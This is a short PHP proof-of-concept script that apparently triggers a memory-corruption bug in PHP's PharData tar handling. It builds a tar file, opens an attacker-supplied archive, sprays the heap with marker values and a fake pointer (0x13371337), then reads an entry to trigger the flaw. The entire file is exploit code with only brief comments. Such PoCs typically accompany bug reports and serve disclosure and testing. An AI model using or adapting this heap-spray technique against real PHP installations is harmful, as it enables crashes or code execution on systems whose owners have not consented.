<?php

echo "Making .tar file...\n";

$phar = new PharData('poc.tar');
$phar->addFromString('aaaa','');

echo "Trigger...\n";

//prepare
$spray = pack('IIII',0x41414141,0x42424242,0x43434343,0x4444444);
$spray = $spray.$spray.$spray.$spray.$spray.$spray.$spray.$spray;
$pointer = pack('I',0x13371337);


$p = new PharData($argv[1]);

// heap spray 
$a[] = $spray.(string)0;
$a[] = $spray.(string)1;
$a[] = $spray.(string)2;
$a[] = $spray.(string)3;
$a[] = $spray.(string)4;
$a[] = $spray.$pointer.(string)5;

var_dump($p['aaaa']->getContent());

// If this poc doesnt work, please un-comment line below.
// var_dump($p);
?>
